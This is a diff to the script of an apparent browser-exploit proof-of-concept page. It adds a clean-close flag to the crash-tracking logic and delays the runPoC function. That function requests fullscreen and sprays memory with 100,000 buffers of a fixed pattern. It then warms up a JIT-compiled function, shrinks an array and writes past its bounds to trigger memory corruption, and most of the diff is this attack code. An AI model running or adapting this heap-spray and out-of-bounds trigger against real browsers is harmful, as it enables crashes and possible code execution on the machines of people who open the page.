@@ -154,65 +154,70 @@ body {
 <script>
 window.onload = () => {
   const wasCrashing = localStorage.getItem("crashFlag") === "1";
-  const time = parseInt(localStorage.getItem("crashTime") || "0");
+  const safeClosed = localStorage.getItem("safeClose") === "1";
+  const lastCrashTime = parseInt(localStorage.getItem("crashTime") || "0");
   const now = Date.now();
-  const elapsed = Math.floor((now - time) / 1000);
+  const elapsed = Math.floor((now - lastCrashTime) / 1000);
 
-  if (wasCrashing && elapsed > 5) {
+  if (wasCrashing && !safeClosed && elapsed > 5) {
     let count = parseInt(localStorage.getItem("crashCount") || "0");
     count++;
     localStorage.setItem("crashCount", count.toString());
 
     alert(`⚠️ Last run may have triggered instability or crash.\n⏱ Elapsed: ${elapsed}s\n💥 Total crashes detected: ${count}`);
-
-    // limpia solo ahora tras alert
-    localStorage.removeItem("crashFlag");
-    localStorage.removeItem("crashTime");
   }
-};
 
-// si se cerró bien, quitamos la marca
-window.addEventListener("beforeunload", () => {
+  // Limpieza de flags
   localStorage.removeItem("crashFlag");
   localStorage.removeItem("crashTime");
+  localStorage.removeItem("safeClose");
+};
+
+// Marcamos cierre limpio
+window.addEventListener("beforeunload", () => {
+  localStorage.setItem("safeClose", "1");
 });
 
 function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  // se marca crash inminente
+  // Preparamos crash flag
   localStorage.setItem("crashFlag", "1");
   localStorage.setItem("crashTime", Date.now().toString());
+  localStorage.removeItem("safeClose"); // Se desmarca el cierre limpio
 
-  document.body.requestFullscreen().then(() => {
-    const PATTERN = 0x43434343;
-    const SPRAY_CNT = 100000;
-    const SPRAY_LEN = 16;
+  setTimeout(() => {
+    document.body.requestFullscreen().then(() => {
+      const PATTERN = 0x43434343;
+      const SPRAY_CNT = 100000;
+      const SPRAY_LEN = 16;
 
-    const spray = [];
-    for (let i = 0; i < SPRAY_CNT; i++) {
-      const buf = new ArrayBuffer(SPRAY_LEN * 4);
-      const u32 = new Uint32Array(buf);
-      for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
-      spray.push({ u32, f64: new Float64Array(buf) });
-    }
+      const spray = [];
+      for (let i = 0; i < SPRAY_CNT; i++) {
+        const buf = new ArrayBuffer(SPRAY_LEN * 4);
+        const u32 = new Uint32Array(buf);
+        for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
+        spray.push({ u32, f64: new Float64Array(buf) });
+      }
 
-    let victim = [1.1, 2.2, 3.3, 4.4];
-    function opt(arr, idx, val) { arr[idx] = val; }
+      let victim = [1.1, 2.2, 3.3, 4.4];
+      function opt(arr, idx, val) { arr[idx] = val; }
 
-    for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
-    victim.length = 1;
-    const TRIGGER_IDX = 3;
-    opt(victim, TRIGGER_IDX, 13.37);
-    let read = victim[TRIGGER_IDX];
+      for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
+      victim.length = 1;
+      const TRIGGER_IDX = 3;
+      opt(victim, TRIGGER_IDX, 13.37);
+      let read = victim[TRIGGER_IDX];
 
-    document.getElementById("popup").style.display = "block";
-  }).catch(err => {
-    document.getElementById("message").textContent = "Error: " + err.message;
-  });
+      document.getElementById("popup").style.display = "block";
+    }).catch(err => {
+      document.getElementById("message").textContent = "Error: " + err.message;
+    });
+  }, 500);
 }
 </script>
+
 
 
 
